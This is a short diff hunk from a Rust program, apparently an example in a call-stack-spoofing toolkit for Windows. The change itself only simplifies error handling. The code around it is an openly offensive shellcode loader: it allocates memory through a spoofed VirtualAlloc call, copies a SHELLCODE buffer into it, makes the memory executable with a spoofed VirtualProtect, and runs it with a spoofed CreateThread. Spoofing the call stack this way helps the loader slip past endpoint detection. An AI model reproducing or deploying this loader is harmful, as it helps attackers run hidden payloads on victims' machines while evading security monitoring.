@@ -33,23 +33,17 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let create_thread = GetProcAddress(kernel32, "CreateThread", None);
 
     // Allocate memory with RW using spoofed VirtualAlloc
-    let addr = spoof!(virtual_alloc, null_mut::<u8>(), SHELLCODE.len(), 0x3000, 0x04)
-        .filter(|&ptr| !ptr.is_null())
-        .ok_or("VirtualAlloc Returned null pointer")?;
+    let addr = spoof!(virtual_alloc, null_mut::<u8>(), SHELLCODE.len(), 0x3000, 0x04)?;
 
     // Copies the shellcode to the allocated memory
     unsafe { copy_nonoverlapping(SHELLCODE.as_ptr().cast(), addr, SHELLCODE.len()) };
 
     // Changes protection to PAGE_EXECUTE_READ
     let mut old_protection = 0usize;
-    spoof!(virtual_protect, addr, SHELLCODE.len(), 0x20, &mut old_protection as *mut _)
-        .filter(|&ptr| !ptr.is_null())
-        .ok_or("VirtualProtect Failed")?;
+    spoof!(virtual_protect, addr, SHELLCODE.len(), 0x20, &mut old_protection as *mut _)?;
 
     // Execute shellcode in new thread
-    spoof!(create_thread, null_mut::<u8>(), 0, addr, null_mut::<u8>(), 0, 0)
-        .filter(|&ptr| !ptr.is_null())
-        .ok_or("CreateThread Failed")?;
+    spoof!(create_thread, null_mut::<u8>(), 0, addr, null_mut::<u8>(), 0, 0)?;
 
     std::thread::sleep(std::time::Duration::from_secs(2000));
     Ok(())
